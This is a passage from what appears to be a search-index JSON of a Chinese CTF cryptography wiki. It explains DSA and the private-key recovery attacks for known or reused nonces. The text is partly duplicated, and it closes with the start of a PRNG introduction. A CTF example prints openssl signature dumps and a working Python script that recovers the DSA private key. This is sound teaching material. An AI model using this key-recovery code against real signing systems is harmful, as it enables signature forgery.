:165B9DD1C93230C31111E5A4E6EB5181F990F702\n\n\n\n\n\u5176\u4e2d\uff0c\u83b7\u53d6\u7684\u7b2c\u4e00\u4e2a\u503c\u662fr\uff0c\u7b2c\u4e8c\u4e2a\u503c\u662fs\u3002\u53ef\u4ee5\u770b\u5230\u7b2c4\u4e2apacket\u548c\u7b2c3\u4e2apacket\u5171\u4eab\u4e86k\uff0c\u56e0\u4e3a\u4ed6\u4eec\u7684r\u4e00\u81f4\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528openssl\u770b\u4e0b\u516c\u94a5\n\n\n\u279c  \n2016\n\u6e56\u6e58\u676fDSA git:\n(\nmaster\n)\n \u2717 openssl dsa -in dsa_public.pem -text -noout  -pubin \n\nread\n DSA key\npub: \n    \n45\n:bb:18:f6:0e:b0:51:f9:d4:82:18:df:8c:d9:56:\n    \n33\n:0a:4f:f3:0a:f5:34:4f:6c:95:40:06:1d:53:83:\n    \n29\n:2d:95:c4:df:c8:ac:26:ca:45:2e:17:0d:c7:9b:\n    e1:5c:c6:15:9e:03:7b:cc:f5:64:ef:36:1c:18:c9:\n    9e:8a:eb:0b:c1:ac:f9:c0:c3:5d:62:0d:60:bb:73:\n    \n11\n:f1:cf:08:cf:bc:34:cc:aa:79:ef:1d:ad:8a:7a:\n    6f:ac:ce:86:65:90:06:d4:fa:f0:57:71:68:57:ec:\n    7c:a6:04:ad:e2:c3:d7:31:d6:d0:2f:93:31:98:d3:\n    \n90\n:c3:ef:c3:f3:ff:04:6f\nP:   \n    \n00\n:c0:59:6c:3b:5e:93:3d:33:78:be:36:26:be:31:\n    5e:e7:0c:a6:b5:b1:1a:51:9b:55:23:d4:0e:5b:a7:\n    \n45\n:66:e2:2c:c8:8b:fe:c5:6a:ad:66:91:8b:9b:30:\n    ad:28:13:88:f0:bb:c6:b8:02:6b:7c:80:26:e9:11:\n    \n84\n:be:e0:c8:ad:10:cc:f2:96:be:cf:e5:05:05:38:\n    3c:b4:a9:54:b3:7c:b5:88:67:2f:7c:09:57:b6:fd:\n    f2:fa:05:38:fd:ad:83:93:4a:45:e4:f9:9d:38:de:\n    \n57\n:c0:8a:24:d0:0d:1c:c5:d5:fb:db:73:29:1c:d1:\n    0c:e7:57:68:90:b6:ba:08:9b\nQ:   \n    \n00\n:86:8f:78:b8:c8:50:0b:eb:f6:7a:58:e3:3c:1f:\n    \n53\n:9d:35:70:d1:bd\nG:   \n    4c:d5:e6:b6:6a:6e:b7:e9:27:94:e3:61:1f:41:53:\n    cb:11:af:5a:08:d9:d4:f8:a3:f2:50:03:72:91:ba:\n    5f:ff:3c:29:a8:c3:7b:c4:ee:5f:98:ec:17:f4:18:\n    bc:71:61:01:6c:94:c8:49:02:e4:00:3a:79:87:f0:\n    d8:cf:6a:61:c1:3a:fd:56:73:ca:a5:fb:41:15:08:\n    cd:b3:50:1b:df:f7:3e:74:79:25:f7:65:86:f4:07:\n    9f:ea:12:09:8b:34:50:84:4a:2a:9e:5d:0a:99:bd:\n    \n86\n:5e:05:70:d5:19:7d:f4:a1:c9:b8:01:8f:b9:9c:\n    dc:e9:15:7b:98:50:01:79\n\n\n\n\n\u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e0a\u9762\u7684\u539f\u7406\u7f16\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u7a0b\u5e8f\u5982\u4e0b\n\n\n#coding=utf8\n\n\nfrom\n \nCrypto.PublicKey\n \nimport\n \nDSA\n\n\nfrom\n \nhashlib\n \nimport\n \nsha1\n\n\nimport\n \ngmpy2\n\n\nwith\n \nopen\n(\n./dsa_public.pem\n)\n \nas\n \nf\n:\n\n    \nkey\n \n=\n \nDSA\n.\nimportKey\n(\nf\n)\n\n    \ny\n \n=\n \nkey\n.\ny\n\n    \ng\n \n=\n \nkey\n.\ng\n\n    \np\n \n=\n \nkey\n.\np\n\n    \nq\n \n=\n \nkey\n.\nq\n\n\nf3\n \n=\n \nopen\n(\nr\npacket3/message3\n,\n \nr\n)\n\n\nf4\n \n=\n \nopen\n(\nr\npacket4/message4\n,\n \nr\n)\n\n\ndata3\n \n=\n \nf3\n.\nread\n()\n\n\ndata4\n \n=\n \nf4\n.\nread\n()\n\n\nsha\n \n=\n \nsha1\n()\n\n\nsha\n.\nupdate\n(\ndata3\n)\n\n\nm3\n \n=\n \nint\n(\nsha\n.\nhexdigest\n(),\n \n16\n)\n\n\nsha\n \n=\n \nsha1\n()\n\n\nsha\n.\nupdate\n(\ndata4\n)\n\n\nm4\n \n=\n \nint\n(\nsha\n.\nhexdigest\n(),\n \n16\n)\n\n\nprint\n \nm3\n,\n \nm4\n\n\ns3\n \n=\n \n0x30EB88E6A4BFB1B16728A974210AE4E41B42677D\n\n\ns4\n \n=\n \n0x5E10DED084203CCBCEC3356A2CA02FF318FD4123\n\n\nr\n \n=\n \n0x5090DA81FEDE048D706D80E0AC47701E5A9EF1CC\n\n\nds\n \n=\n \ns4\n \n-\n \ns3\n\n\ndm\n \n=\n \nm4\n \n-\n \nm3\n\n\nk\n \n=\n \ngmpy2\n.\nmul\n(\ndm\n,\n \ngmpy2\n.\ninvert\n(\nds\n,\n \nq\n))\n\n\nk\n \n=\n \ngmpy2\n.\nf_mod\n(\nk\n,\n \nq\n)\n\n\ntmp\n \n=\n \ngmpy2\n.\nmul\n(\nk\n,\n \ns3\n)\n \n-\n \nm3\n\n\nx\n \n=\n \ntmp\n \n*\n \ngmpy2\n.\ninvert\n(\nr\n,\n \nq\n)\n\n\nx\n \n=\n \ngmpy2\n.\nf_mod\n(\nx\n,\n \nq\n)\n\n\nprint\n \nint\n(\nx\n)\n\n\n\n\n\n\u6211\u53d1\u73b0pip\u5b89\u88c5\u7684pycrypto\u7adf\u7136\u6ca1\u6709DSA\u7684importKey\u51fd\u6570\u3002\u3002\u3002\u53ea\u597d\u4ecegithub\u4e0a\u4e0b\u8f7d\u5b89\u88c5\u4e86pycrypto\u3002\u3002\u3002\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  \n2016\n\u6e56\u6e58\u676fDSA git:\n(\nmaster\n)\n \u2717 python exp.py\n\n1104884177962524221174509726811256177146235961550\n \n943735132044536149000710760545778628181961840230\n\n\n520793588153805320783422521615148687785086070744", 
            "title": "DSA \u6570\u5b57\u7b7e\u540d"
        }, 
        {
            "location": "/crypto/signature/dsa/#dsa", 
            "text": "\u4e0a\u9762\u6240\u63cf\u8ff0\u7684ElGamal\u7b7e\u540d\u7b97\u6cd5\u5728\u5b9e\u9645\u4e2d\u5e76\u4e0d\u5e38\u7528\uff0c\u66f4\u5e38\u7528\u7684\u662f\u5176\u53d8\u4f53DSA\u3002", 
            "title": "DSA"
        }, 
        {
            "location": "/crypto/signature/dsa/#_1", 
            "text": "", 
            "title": "\u57fa\u672c\u539f\u7406"
        }, 
        {
            "location": "/crypto/signature/dsa/#_2", 
            "text": "\u9009\u62e9\u4e00\u4e2a\u5408\u9002\u7684\u54c8\u5e0c\u51fd\u6570\uff0c\u76ee\u524d\u4e00\u822c\u9009\u62e9SHA1\uff0c\u5f53\u524d\u4e5f\u53ef\u4ee5\u9009\u62e9\u5f3a\u5ea6\u66f4\u9ad8\u7684\u54c8\u5e0c\u51fd\u6570H\u3002  \u9009\u62e9\u5bc6\u94a5\u7684\u957f\u5ea6L\u548cN\uff0c\u8fd9\u4e24\u4e2a\u503c\u51b3\u5b9a\u4e86\u7b7e\u540d\u7684\u5b89\u5168\u7a0b\u5ea6\u3002\u5728\u6700\u521d\u7684DSS\uff08 Digital Signature Standard  \uff09\u4e2d\u5efa\u8baeL\u5fc5\u987b\u4e3a64\u7684\u500d\u6570\uff0c\u5e76\u4e14 512 \\leq L \\leq 1024 512 \\leq L \\leq 1024  \uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u66f4\u5927\u3002N\u5fc5\u987b\u5927\u5c0f\u5fc5\u987b\u4e0d\u5927\u4e8e\u54c8\u5e0c\u51fd\u6570H\u8f93\u51fa\u7684\u957f\u5ea6\u3002FIPS 186-3\u7ed9\u51fa\u4e86\u4e00\u4e9b\u5efa\u8bae\u7684L\u548cN\u7684\u53d6\u503c\u4f8b\u5b50\uff1a(1024, 160)\uff0c (2048, 224)\uff0c (2048, 256)\uff0c\u4ee5\u53ca (3,072, 256)\u3002  \u9009\u62e9N\u6bd4\u7279\u7684\u7d20\u6570q\u3002  \u9009\u62e9L\u6bd4\u7279\u7684\u7d20\u6570p\uff0c\u4f7f\u5f97p-1\u662fq\u7684\u500d\u6570\u3002  \u9009\u62e9\u6ee1\u8db3 g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p  \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u7684g\uff0c\u5373\u5728\u6a21p\u7684\u80cc\u666f\u4e0b\uff0cord(g)=q\u7684g\u3002\u5373g\u5728\u6a21p\u7684\u610f\u4e49\u4e0b\uff0c\u5176\u6307\u6570\u6b21\u5e42\u53ef\u4ee5\u751f\u6210\u5177\u6709q\u4e2a\u5143\u7d20\u7684\u5b50\u7fa4\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97 g=h^{\\frac{p-1}{q}} \\bmod p g=h^{\\frac{p-1}{q}} \\bmod p  \u6765\u5f97\u5230g\uff0c\u5176\u4e2d 1  h   p-1 1< h < p-1  \u3002  \u9009\u62e9\u79c1\u94a5x\uff0c 0 x q 0<x<q  \uff0c\u8ba1\u7b97 y \\equiv g^x \\bmod p y \\equiv g^x \\bmod p  \u3002   \u516c\u94a5\u4e3a(p,q,g,y)\uff0c\u79c1\u94a5\u4e3a(x)\u3002", 
            "title": "\u5bc6\u94a5\u751f\u6210"
        }, 
        {
            "location": "/crypto/signature/dsa/#_3", 
            "text": "\u7b7e\u540d\u6b65\u9aa4\u5982\u4e0b   \u9009\u62e9\u968f\u673a\u6574\u6570\u6570k\u4f5c\u4e3a\u4e34\u65f6\u5bc6\u94a5\uff0c 0 k q 0<k<q  \u3002  \u8ba1\u7b97 r\\equiv (g^k \\bmod p) \\bmod q r\\equiv (g^k \\bmod p) \\bmod q  \u8ba1\u7b97 s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q   \u7b7e\u540d\u7ed3\u679c\u4e3a(r,s)\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u4e0eElgamal\u5f88\u91cd\u8981\u7684\u4e0d\u540c\u662f\u8fd9\u91cc\u4f7f\u7528\u4e86\u54c8\u5e0c\u51fd\u6570\u5bf9\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u5904\u7406\u3002", 
            "title": "\u7b7e\u540d"
        }, 
        {
            "location": "/crypto/signature/dsa/#_4", 
            "text": "\u9a8c\u8bc1\u8fc7\u7a0b\u5982\u4e0b   \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c w=s^{-1} \\bmod q w=s^{-1} \\bmod q  \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c u_1=H(m)w \\bmod q u_1=H(m)w \\bmod q  \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c u_2=rw \\bmod q u_2=rw \\bmod q  \u8ba1\u7b97 v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q  \u5982\u679cv\u4e0er\u76f8\u7b49\uff0c\u5219\u6821\u9a8c\u6210\u529f\u3002", 
            "title": "\u9a8c\u8bc1"
        }, 
        {
            "location": "/crypto/signature/dsa/#_5", 
            "text": "\u9996\u5148\uff0cg \u6ee1\u8db3  g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p  \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u3002\u6240\u4ee5  g^q \\equiv 1 \\bmod p g^q \\equiv 1 \\bmod p   \u3002\u6240\u4ee5  g^x \\equiv g^{x \\bmod q} \\bmod p g^x \\equiv g^{x \\bmod q} \\bmod p  \u3002\u8fdb\u800c  v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw}  \u53c8 s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q  \u4e14 w=s^{-1} \\bmod q w=s^{-1} \\bmod q  \u6240\u4ee5  k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q  \u6240\u4ee5 v \\equiv g^k v \\equiv g^k  \u3002\u6b63\u786e\u6027\u5f97\u8bc1\u3002", 
            "title": "\u6b63\u786e\u6027\u63a8\u5bfc"
        }, 
        {
            "location": "/crypto/signature/dsa/#_6", 
            "text": "", 
            "title": "\u5b89\u5168\u6027"
        }, 
        {
            "location": "/crypto/signature/dsa/#k", 
            "text": "", 
            "title": "\u5df2\u77e5k"
        }, 
        {
            "location": "/crypto/signature/dsa/#_7", 
            "text": "\u5982\u679c\u77e5\u9053\u4e86\u968f\u673a\u5bc6\u94a5k\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6839\u636e s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q  \u8ba1\u7b97\u79c1\u94a5d\uff0c\u51e0\u4e4e\u653b\u7834\u4e86DSA\u3002  \u8fd9\u91cc\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6d88\u606f\u7684hash\u503c\u90fd\u4f1a\u7ed9\u51fa\u3002  x \\equiv r^{-1}(ks-H(m)) \\bmod q x \\equiv r^{-1}(ks-H(m)) \\bmod q", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/signature/dsa/#k_1", 
            "text": "", 
            "title": "k\u5171\u4eab"
        }, 
        {
            "location": "/crypto/signature/dsa/#_8", 
            "text": "\u5982\u679c\u5728\u4e24\u6b21\u7b7e\u540d\u7684\u8fc7\u7a0b\u4e2d\u5171\u4eab\u4e86k\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002  \u5047\u8bbe\u7b7e\u540d\u7684\u6d88\u606f\u4e3am1,m2\uff0c\u663e\u7136\uff0c\u4e24\u8005\u7684r\u7684\u503c\u4e00\u6837\uff0c\u6b64\u5916  s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q  s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q  \u8fd9\u91cc\u6211\u4eec\u9664\u4e86x\u548ck\u4e0d\u77e5\u9053\u5269\u4e0b\u7684\u5747\u77e5\u9053\uff0c\u90a3\u4e48  s_1k \\equiv H(m_1)+xr s_1k \\equiv H(m_1)+xr  s_2k \\equiv H(m_2)+xr s_2k \\equiv H(m_2)+xr  \u4e24\u5f0f\u76f8\u51cf  k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q  \u6b64\u65f6 \u5373\u53ef\u89e3\u51fak\uff0c\u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u89e3\u51fax\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/signature/dsa/#_9", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5\u6e56\u6e58\u676f\u7684DSA\u4e3a\u4f8b\uff0c\u4f46\u662f\u4e0d\u80fd\u76f4\u63a5\u53bb\u505a\uff0c\uff0c\uff0c\u56e0\u4e3a\u53d1\u73b0\u5728\u9a8c\u8bc1message4\u7684\u65f6\u5019\u7b7e\u540d\u4e0d\u901a\u8fc7\u3002\u6e90\u9898\u76ee\u6211\u6ca1\u6709\u4e86\uff0c\u3002\uff0c\uff0c\u8fd9\u91cc\u6211\u4ee5Jarvis OJ\u4e2d\u7ecf\u8fc7\u4fee\u6539\u7684\u9898\u76eeDSA\u4e3a\u4f8b  \u279c   2016 \u6e56\u6e58\u676fDSA git: ( master )  \u2717 openssl sha1 -verify dsa_public.pem -signature packet1/sign1.bin  packet1/message1  \nVerified OK\n\u279c   2016 \u6e56\u6e58\u676fDSA git: ( master )  \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin  packet2/message1 \npacket2/message1: No such file or directory\n\u279c   2016 \u6e56\u6e58\u676fDSA git: ( master )  \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin  packet2/message2 \nVerified OK\n\u279c   2016 \u6e56\u6e58\u676fDSA git: ( master )  \u2717 openssl sha1 -verify dsa_public.pem -signature packet3/sign3.bin  packet3/message3 \nVerified OK\n\u279c   2016 \u6e56\u6e58\u676fDSA git: ( master )  \u2717 openssl sha1 -verify dsa_public.pem -signature packet4/sign4.bin  packet4/message4\nVerified OK  \u53ef\u4ee5\u770b\u51fa\u56db\u5219\u6d88\u606f\u5168\u90e8\u6821\u9a8c\u901a\u8fc7\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f1a\u8054\u60f3\u5230\u5171\u4eabk\u662f\u56e0\u4e3a\u9898\u76ee\u4e2d\u63d0\u793a\u4e86PS3\u7684\u7834\u89e3\u66fe\u7528\u5230\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u4ece\u7f51\u4e0a\u641c\u7d22\u53ef\u77e5\u8be5\u653b\u51fb\u3002  \u4e0b\u9762\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u7b7e\u540d\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u547d\u4ee4\u5982\u4e0b  \u279c   2016 \u6e56\u6e58\u676fDSA git: ( master )  \u2717 openssl asn1parse -inform der -in packet4/sign4.bin  \n     0 :d = 0    hl = 2   l =    44  cons: SEQUENCE          \n     2 :d = 1    hl = 2   l =    20  prim: INTEGER           :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC\n    24 :d = 1    hl = 2   l =    20  prim: INTEGER           :5E10DED084203CCBCEC3356A2CA02FF318FD4123\n\u279c   2016 \u6e56\u6e58\u676fDSA git: ( master )  \u2717 openssl asn1parse -inform der -in packet3/sign3.bin  \n     0 :d = 0    hl = 2   l =    44  cons: SEQUENCE          \n     2 :d = 1    hl = 2   l =    20  prim: INTEGER           :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC\n    24 :d = 1    hl = 2   l =    20  prim: INTEGER           :30EB88E6A4BFB1B16728A974210AE4E41B42677D\n\u279c   2016 \u6e56\u6e58\u676fDSA git: ( master )  \u2717 openssl asn1parse -inform der -in packet2/sign2.bin  \n     0 :d = 0    hl = 2   l =    44  cons: SEQUENCE          \n     2 :d = 1    hl = 2   l =    20  prim: INTEGER           :60B9F2A5BA689B802942D667ED5D1EED066C5A7F\n    24 :d = 1    hl = 2   l =    20  prim: INTEGER           :3DC8921BA26B514F4D991A85482750E0225A15B5\n\u279c   2016 \u6e56\u6e58\u676fDSA git: ( master )  \u2717 openssl asn1parse -inform der -in packet1/sign1.bin  \n     0 :d = 0    hl = 2   l =    45  cons: SEQUENCE          \n     2 :d = 1    hl = 2   l =    21  prim: INTEGER           :8158B477C5AA033D650596E93653C730D26BA409\n    25 :d = 1    hl = 2   l =    20  prim: INTEGER           :165B9DD1C93230C31111E5A4E6EB5181F990F702  \u5176\u4e2d\uff0c\u83b7\u53d6\u7684\u7b2c\u4e00\u4e2a\u503c\u662fr\uff0c\u7b2c\u4e8c\u4e2a\u503c\u662fs\u3002\u53ef\u4ee5\u770b\u5230\u7b2c4\u4e2apacket\u548c\u7b2c3\u4e2apacket\u5171\u4eab\u4e86k\uff0c\u56e0\u4e3a\u4ed6\u4eec\u7684r\u4e00\u81f4\u3002  \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528openssl\u770b\u4e0b\u516c\u94a5  \u279c   2016 \u6e56\u6e58\u676fDSA git: ( master )  \u2717 openssl dsa -in dsa_public.pem -text -noout  -pubin  read  DSA key\npub: \n     45 :bb:18:f6:0e:b0:51:f9:d4:82:18:df:8c:d9:56:\n     33 :0a:4f:f3:0a:f5:34:4f:6c:95:40:06:1d:53:83:\n     29 :2d:95:c4:df:c8:ac:26:ca:45:2e:17:0d:c7:9b:\n    e1:5c:c6:15:9e:03:7b:cc:f5:64:ef:36:1c:18:c9:\n    9e:8a:eb:0b:c1:ac:f9:c0:c3:5d:62:0d:60:bb:73:\n     11 :f1:cf:08:cf:bc:34:cc:aa:79:ef:1d:ad:8a:7a:\n    6f:ac:ce:86:65:90:06:d4:fa:f0:57:71:68:57:ec:\n    7c:a6:04:ad:e2:c3:d7:31:d6:d0:2f:93:31:98:d3:\n     90 :c3:ef:c3:f3:ff:04:6f\nP:   \n     00 :c0:59:6c:3b:5e:93:3d:33:78:be:36:26:be:31:\n    5e:e7:0c:a6:b5:b1:1a:51:9b:55:23:d4:0e:5b:a7:\n     45 :66:e2:2c:c8:8b:fe:c5:6a:ad:66:91:8b:9b:30:\n    ad:28:13:88:f0:bb:c6:b8:02:6b:7c:80:26:e9:11:\n     84 :be:e0:c8:ad:10:cc:f2:96:be:cf:e5:05:05:38:\n    3c:b4:a9:54:b3:7c:b5:88:67:2f:7c:09:57:b6:fd:\n    f2:fa:05:38:fd:ad:83:93:4a:45:e4:f9:9d:38:de:\n     57 :c0:8a:24:d0:0d:1c:c5:d5:fb:db:73:29:1c:d1:\n    0c:e7:57:68:90:b6:ba:08:9b\nQ:   \n     00 :86:8f:78:b8:c8:50:0b:eb:f6:7a:58:e3:3c:1f:\n     53 :9d:35:70:d1:bd\nG:   \n    4c:d5:e6:b6:6a:6e:b7:e9:27:94:e3:61:1f:41:53:\n    cb:11:af:5a:08:d9:d4:f8:a3:f2:50:03:72:91:ba:\n    5f:ff:3c:29:a8:c3:7b:c4:ee:5f:98:ec:17:f4:18:\n    bc:71:61:01:6c:94:c8:49:02:e4:00:3a:79:87:f0:\n    d8:cf:6a:61:c1:3a:fd:56:73:ca:a5:fb:41:15:08:\n    cd:b3:50:1b:df:f7:3e:74:79:25:f7:65:86:f4:07:\n    9f:ea:12:09:8b:34:50:84:4a:2a:9e:5d:0a:99:bd:\n     86 :5e:05:70:d5:19:7d:f4:a1:c9:b8:01:8f:b9:9c:\n    dc:e9:15:7b:98:50:01:79  \u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e0a\u9762\u7684\u539f\u7406\u7f16\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u7a0b\u5e8f\u5982\u4e0b  #coding=utf8  from   Crypto.PublicKey   import   DSA  from   hashlib   import   sha1  import   gmpy2  with   open ( ./dsa_public.pem )   as   f : \n     key   =   DSA . importKey ( f ) \n     y   =   key . y \n     g   =   key . g \n     p   =   key . p \n     q   =   key . q  f3   =   open ( r packet3/message3 ,   r )  f4   =   open ( r packet4/message4 ,   r )  data3   =   f3 . read ()  data4   =   f4 . read ()  sha   =   sha1 ()  sha . update ( data3 )  m3   =   int ( sha . hexdigest (),   16 )  sha   =   sha1 ()  sha . update ( data4 )  m4   =   int ( sha . hexdigest (),   16 )  print   m3 ,   m4  s3   =   0x30EB88E6A4BFB1B16728A974210AE4E41B42677D  s4   =   0x5E10DED084203CCBCEC3356A2CA02FF318FD4123  r   =   0x5090DA81FEDE048D706D80E0AC47701E5A9EF1CC  ds   =   s4   -   s3  dm   =   m4   -   m3  k   =   gmpy2 . mul ( dm ,   gmpy2 . invert ( ds ,   q ))  k   =   gmpy2 . f_mod ( k ,   q )  tmp   =   gmpy2 . mul ( k ,   s3 )   -   m3  x   =   tmp   *   gmpy2 . invert ( r ,   q )  x   =   gmpy2 . f_mod ( x ,   q )  print   int ( x )   \u6211\u53d1\u73b0pip\u5b89\u88c5\u7684pycrypto\u7adf\u7136\u6ca1\u6709DSA\u7684importKey\u51fd\u6570\u3002\u3002\u3002\u53ea\u597d\u4ecegithub\u4e0a\u4e0b\u8f7d\u5b89\u88c5\u4e86pycrypto\u3002\u3002\u3002  \u7ed3\u679c\u5982\u4e0b  \u279c   2016 \u6e56\u6e58\u676fDSA git: ( master )  \u2717 python exp.py 1104884177962524221174509726811256177146235961550   943735132044536149000710760545778628181961840230  520793588153805320783422521615148687785086070744", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/prng/introduction/", 
            "text": "\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4ecb\u7ecd\n\n\n\u6982\u8ff0\n\n\n\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08pseudorandom number generator\uff0cPRNG\uff09\uff0c\u53c8\u79f0\u4e3a\u786e\u5b9a\u6027\u968f\u673a\u4f4d\u751f\u6210\u5668\uff08deterministic random bit generator\uff0cDRBG\uff09\uff0c\u662f\u7528\u6765\u751f\u6210\n\u63a5\u8fd1\u4e8e\u7edd\u5bf9\u968f\u673a\u6570\u5e8f\u5217\u7684\u6570\u5b57\u5e8f\u5217\n\u7684\u7b97\u6cd5\u3002\u4e00\u822c\u6765\u8bf4\uff0cPRNG \u4f1a\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u521d\u59cb\u503c\uff0c\u4e5f\u79f0\u4e3a\u79cd\u5b50\uff0c\u6765\u751f\u6210\u5bf9\u5e94\u7684\u4f2a\u968f\u673a\u6570\u5e8f\u5217\u3002\u53ea\u8981\u79cd\u5b50\u786e\u5b9a\u4e86\uff0cPRNG \u6240\u751f\u6210\u7684\u968f\u673a\u6570\u5c31\u662f\u5b8c\u5168\u786e\u5b9a\u7684\uff0c\u56e0\u6b64\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u5e76\u4e0d\u662f\u771f\u6b63\u968f\u673a\u7684\u3002\n\n\n\u5c31\u76ee\u524d\u800c\u8a00\uff0cPRNG \u5728\u4f17\u591a\u5e94\u7528\u90fd\u53d1\u6325\u7740\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u6bd4\u5982\u6a21\u62df\uff08\u8499\u7279\u5361\u6d1b\u65b9\u6cd5\uff09\uff0c\u7535\u5b50\u7ade\u6280\uff0c\u5bc6\u7801\u5e94\u7528\u3002\n\n\n\u5468\u671f\u6027\n\n\n\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u4e00\u65e6 PRNG \u6240\u4f9d\u8d56\u7684\u79cd\u5b50\u786e\u5b9a\u4e86\uff0c\u90a3\u4e48 PRNG \u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u57fa\u672c\u4e5f\u5c31\u786e\u5b9a\u4e86\u3002\u8fd9\u91cc\u5b9a\u4e49 PRNG \u7684\u5468\u671f\u5982\u4e0b\uff1a\u5bf9\u4e8e\u4e00\u4e2a PRNG \u7684\n\u6240\u6709\u53ef\u80fd\u8d77\u59cb\u72b6\u6001\n\uff0c\u4e0d\u91cd\u590d\u5e8f\u5217\u7684\u6700\u957f\u957f\u5ea6\u3002\u663e\u7136\uff0c\u5bf9\u4e8e\u4e00\u4e2a PRNG \u6765\u8bf4\uff0c\u5176\u5468\u671f\u4e0d\u4f1a\u5927\u4e8e\u5176\u6240\u6709\u53ef\u80fd\u7684\u72b6\u6001\u3002\u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u5f53\u6211\u4eec\u9047\u5230\u91cd\u590d\u7684\u8f93\u51fa\u65f6\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f PRNG \u7684\u5468\u671f\uff0c\u56e0\u4e3a PRNG \u7684\u72b6\u6001\u4e00\u822c\u90fd\u662f\u5927\u4e8e\u8f93\u51fa\u7684\u4f4d\u6570\u7684\u3002\n\n\n\u8bc4\u4ef7\u6807\u51c6\n\n\n\u53c2\u89c1\u7ef4\u57fa\u767e\u79d1\uff0c\nhttps://en.wikipedia.org/wiki/Pseudorandom_number_generator\n\u3002\n\n\n\u5206\u7c7b\n\n\n\u76ee\u524d\u901a\u7528\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4e3b\u8981\u6709\n\n\n\n\n\u7ebf\u6027\u540c\u4f59\u53d1\u751f\u5668\uff0cLCG\n\n\n\u7ebf\u6027\u56de\u5f52\u53d1\u751f\u5668\n\n\nMersenne Twister\n\n\nxorshift\n generators\n\n\nWELL\n family of 